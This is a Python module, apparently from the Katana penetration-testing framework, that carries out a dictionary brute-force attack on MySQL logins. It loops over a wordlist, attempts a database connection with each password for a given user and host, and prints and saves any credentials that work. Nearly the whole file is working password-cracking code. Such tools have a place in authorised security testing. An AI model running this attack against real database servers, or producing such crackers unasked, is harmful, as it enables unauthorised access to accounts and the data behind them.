# This module requires katana framework 
# https://github.com/RedToor/Katana

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KATANAFRAMEWORK import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES
from core.Function import isLive,saveRegister
import MySQLdb
# END LIBRARIES

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.1"
	init.Description        ="Brute Force to SQL protocol."
	init.CodeName           ="btf/pr.sql"
	init.DateCreation       ="16/05/2015"      
	init.LastModification   ="24/05/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE                RQ     DESCRIPTION
		'target':[LOCAL_IP            ,True ,'Host Target'],
		'port'  :[SQL_PORT            ,False,'Port Target'],
		'user'  :[USERNAME            ,True ,'Username target'],
		'dict'  :[DITIONARY_PASSWORDS ,False,'Wordlist'],
	}
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	isLive(init.var['target'],init.var['port'])
	Loadingfile(init.var['dict'])

	with open(init.var['dict'],'r') as passwords:
		for password in passwords:
			password=password.replace("\n","")
			try:
				MySQLdb.connect(init.var['target'],init.var['user'],password,'',int(init.var['port']))
				if True:
					printAlert(3,"Successfully with ["+init.var['user']+"]["+password+"]\n")
					saveRegister(init,password)
					return
			except:printAlert(0," | Checking '"+password+"'")
	printAlert(4," No Result :c\n")
	
# END CODE MODULE ############################################################################################